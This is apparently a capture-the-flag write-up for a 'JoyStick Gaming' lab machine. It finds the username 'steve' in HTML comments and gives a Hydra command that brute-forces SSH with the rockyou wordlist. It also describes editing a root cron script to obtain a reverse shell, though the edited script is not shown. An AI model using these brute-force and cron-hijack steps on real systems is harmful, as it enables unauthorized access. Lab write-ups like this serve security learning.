# Website Enum
We can directly see a hint inside the source code.
- Source code
    ```html
        <!DOCTYPE html>
    <html lang="en" dir="ltr">
      <head>
        <meta charset="utf-8">
        <title>JoyStick Gaming</title>
      </head>
      <body>
        <p>JoyStick gaming minecraft server, open shortly to the public!</p>
        <!-- Zach, I don't care that you named your user steve. You still need to
          finish making the website -->
        <!-- Great, and now the FTP server just doesn't work. Just another great idea after
    	your failed irc chat. Why would we use that when we have in game chat? 
    	Not to mention that I know you still haven't reset your password.  -->
      </body>
    </html> 

    ```

From this we have a potential user "steve"

# User Access
To get user access we can symply brute-force the ssh login with user 'steve' and use rockyou password list
- Brute-Forcing
    Here i am going to use Hydra 
    `hydra -l steve -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <ip> ssh`
    ```bash
    [22][ssh] host: 10.10.50.224   login: steve   password: ********
    ```
    You will find the password of user steve and get user flag easily.

# Privilege Escalation

Actually to get the root.txt in this machine, we don't really need to escalate our privilege. It is because the root.txt is stored in other user's home directory.
yet we are still going to do it for the fun of it.

- Cronjob
on the crontab we can see that /opt/minecraft/backup.sh is executed as root
we can edit the file to return a reverse shell to us.

Sorry for no Screenshot of the crontab, it is just my machine was so slow.

here is the edited backup.sh and the shell we get
